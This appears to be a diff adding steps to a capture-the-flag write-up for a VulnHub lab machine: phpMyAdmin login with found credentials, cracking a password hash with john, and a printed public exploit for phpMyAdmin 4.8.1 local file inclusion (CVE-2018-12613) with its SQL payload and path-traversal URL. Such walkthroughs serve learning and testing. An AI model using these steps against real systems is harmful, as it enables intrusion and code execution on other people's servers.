@@ -134,5 +134,65 @@ Now we can see phpmyadmin running there:
 
 ![](https://i.ibb.co/wcX07d6/Screenshot-4.png)
 
-We can use creds here `votebox:casoj3FFASPsbyoRP` & we're in!
+We can use creds here `votebox:casoj3FFASPsbyoRP` & we're in! Under `users` table we can see a username and an encrypted password, let's crack it with john (takes some time):
+
+```
+$ touch password
+$ cat password 
+2y$12$d/nOEjKNgk/epF2BeAFaMu8hW4ae3JJk8ITyh48q97awT/G7eQ11i
+$ john --wordlist=/usr/share/wordlists/rockyou.txt password
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Stella           (?)
+```
+
+Now if we try to login with SSH we cant:
+
+```
+$ ssh admin@$ip -p 2082
+admin@192.168.1.14: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).
+```
+
+We need to find another way to get access.. let's check phpmyadmin version:
+
+![](https://i.imgur.com/7Pn1wDQ.png)
+
+Let's search for possible exploits:
+
+```
+$ searchsploit phpmyadmin 4.8.1
+------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                         |  Path
+------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (1)                                                                                            | php/webapps/44924.txt
+phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (2)                                                                                            | php/webapps/44928.txt
+```
+
+Here we go.. let's check it:
+
+```
+$ searchsploit -m php/webapps/44928.txt
+  Exploit: phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (2)
+      URL: https://www.exploit-db.com/exploits/44928
+     Path: /usr/share/exploitdb/exploits/php/webapps/44928.txt
+File Type: ASCII text, with CRLF line terminators
+
+Copied to: /root/Documents/vulnhub/presidential/44928.txt
+
+$ cat 44928.txt 
+# Exploit Title: phpMyAdmin 4.8.1 - Local File Inclusion to Remote Code Execution
+# Date: 2018-06-21
+# Exploit Author: VulnSpy
+# Vendor Homepage: http://www.phpmyadmin.net
+# Software Link: https://github.com/phpmyadmin/phpmyadmin/archive/RELEASE_4_8_1.tar.gz
+# Version: 4.8.0, 4.8.1
+# Tested on: php7 mysql5
+# CVE : CVE-2018-12613
+
+1. Run SQL Query : select '<?php phpinfo();exit;?>'
+2. Include the session file :
+http://1a23009a9c9e959d9c70932bb9f634eb.vsplate.me/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_11njnj4253qq93vjm9q93nvc7p2lq82k#     
+```
+
+Perfect we can spawn a shell! 
+
 
